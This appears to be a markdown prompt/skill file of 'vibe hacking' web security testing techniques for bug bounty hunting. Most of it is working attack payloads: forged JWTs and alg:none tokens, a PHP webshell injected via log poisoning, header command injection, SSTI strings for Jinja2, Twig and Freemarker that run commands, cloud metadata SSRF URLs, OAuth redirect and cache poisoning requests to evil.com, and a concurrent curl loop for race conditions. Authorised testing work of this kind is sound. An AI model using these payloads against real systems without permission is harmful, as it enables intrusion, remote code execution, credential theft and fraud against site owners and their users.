---
name: "h1-vibe-hacking-prompts"
description: "100 AI security testing prompts from VibeSecurity — JWT algorithm confusion, race condition, log poisoning, source map exposure, Firebase creds in JS, cloud metadata SSRF, OAuth redirect, deserialization RCE, MFA bypass, SSTI to RCE"
category: web-security
tags: ["vibe-hacking", "ai-prompts", "jwt", "race-condition", "log-poisoning", "source-map", "firebase", "deserialization", "mfa-bypass", "hackerone"]
relevance: 10
---

# Vibe Hacking — 100 AI Security Testing Prompts

## ⚡ Low Hanging Fruits (Not in Itzraven)

### HTML Comment Secrets
Check ALL HTML responses for comments containing:
```regex
<!--(.*?)-->
```
Focus on: debug notes, commented-out API keys, TODO with credentials, disabled auth checks.

### Source Map Exposure
Check for JavaScript source maps:
```
/app.js.map
/main.abc123.js.map
/static/js/bundle.js.map
/_next/static/chunks/pages/index-*.js.map
```
If found → download + reverse to original source code. Extract API keys, endpoints, logic.

### Docker & K8s Config Exposure
```
/docker-compose.yml -> cloud credentials
/kubernetes/kubeconfig -> cluster access
/Dockerfile -> base image + ENV secrets
/values.yaml -> Helm secrets
```

### Firebase & NoSQL Creds in JS
In JS files, search for:
```javascript
firebase.initializeApp({apiKey: "...", authDomain: "...", databaseURL: "...", projectId: "..."})
MongoClient.connect("mongodb://...")
Elasticsearch({host: "..."})
```

### Debug Mode Detection
Check for debug modes that leak internals:
```
/app?debug=true
/app?debug=1
X-Debug: true header
```
If 200 + verbose output → sensitive info leak.

## 🔓 Authentication Bypass (Unique)

### JWT Algorithm Confusion
```python
# Test RS256→HS256 confusion
import jwt
public_key = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"
# If server uses public key to verify HS256 → forge tokens
token = jwt.encode({"admin": True, "user": "admin"}, public_key, algorithm="HS256")
```

### JWT None Algorithm
Send tokens with `alg: none`:
```json
Header: {"alg": "none", "typ": "JWT"}
Payload: {"sub": "admin", "admin": true}
```
Send base64(header).base64(payload). (no signature)

### MFA Bypass Techniques
1. Direct API call to sensitive endpoint without 2FA step
2. Manipulate response: change `{"verified": false}` to `{"verified": true}`
3. Reuse old valid session after MFA step
4. OTP token reuse across windows

### OAuth Open Redirect
Test OAuth flows:
```
/oauth/authorize?redirect_uri=https://evil.com
/oauth/callback?code=ATTACKER_CODE&state=...
```
If redirect_uri is not validated → steal OAuth codes.

## 💣 Command Injection (Edge Cases)

### Log Poisoning LFI → RCE
1. Find LFI: `/page?file=../../../../var/log/apache2/access.log`
2. Inject PHP in User-Agent: `User-Agent: <?php system($_GET['c']); ?>`
3. Access log via LFI: `/page?file=../../../../var/log/apache2/access.log&c=id`

### Header-Based RCE
Test command injection in headers:
```
X-Forwarded-For: $(whoami)
User-Agent: `id`
Referer: ;id;
```

### SSTI to RCE Detection
Template engines to test (all can lead to RCE):
```
Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Twig: {{['id']|filter('system')}}
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Velocity: #set($x='') $x.class.forName('java.lang.Runtime').getMethod('exec','').invoke(...)
```

### Deserialization RCE
Magic bytes to detect:
- Java: `aced0005` (base64: `rO0AB`)
- PHP: `O:8:"stdClass":0:{}` (serialized object)
- Python picke: `gAN9cQBYBgAA...`
- .NET ViewState: `__VIEWSTATE=` parameter

## 🌐 SSRF Edge Cases

### Cloud Metadata SSRF (All Providers)
```
AWS:      http://169.254.169.254/latest/meta-data/
GCP:      http://metadata.google.internal/computeMetadata/v1/
Azure:    http://169.254.169.254/metadata/instance?api-version=2017-08-01
Alibaba:  http://100.100.100.200/latest/meta-data/
DO:       https://api.digitalocean.com/v2/ (with OAuth)
```
Try with different protocols: `http://`, `https://`, `gopher://`, `dict://`, `file://`

### Blind SSRF via DNS
Use collaborator/interact.sh:
```
url=http://YOUR.BURPCOLLABORATOR.NET/oob
url=http://YOUR.interact.sh/callback
```
Monitor DNS/HTTP callback → confirms SSRF

## 🗄️ Web Cache Poisoning

### Host Header Cache Poisoning
```
GET / HTTP/1.1
Host: evil.com
```
If response contains `evil.com` in links/scripts → poisoned for all users.

### URL Override Cache Poisoning
```
GET / HTTP/1.1
X-Original-URL: /admin
X-Rewrite-URL: /evil
```
If backend processes override URL but CDN caches original → cache poisoned.

### CDN Cache Poisoning
Test Fastly/Cloudflare behavior:
```
GET / HTTP/1.1
X-Forwarded-Host: evil.com
```
Check `CF-Cache-Status: HIT` → public cache poisoned.

## 🔀 Race Condition Detection

### Methodology:
1. Identify shared resource operations (coupons, wallet, likes, follows)
2. Send 20-50 concurrent requests:
```bash
for i in {1..50}; do
  curl -X POST https://target.com/api/coupon/redeem \
    -d '{"code":"FREE100"}' &
done
```
3. If coupon applied >1 times → race condition

### Test all:
- Gift card redemption
- Wallet withdrawal
- Like/unlike counts
- Email change verification
- File upload (race before validation)

## 🛡️ Security Misconfiguration

### Missing Security Headers Checklist
```
Strict-Transport-Security: max-age=31536000
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: ...
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: ...
```

### GraphQL Introspection Test
```graphql
query { __schema { types { name fields { name } } } }
```
If returns schema → full API surface exposed.

### CORS Wildcard Test
```
Origin: https://evil.com
```
If `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` → data theft possible.
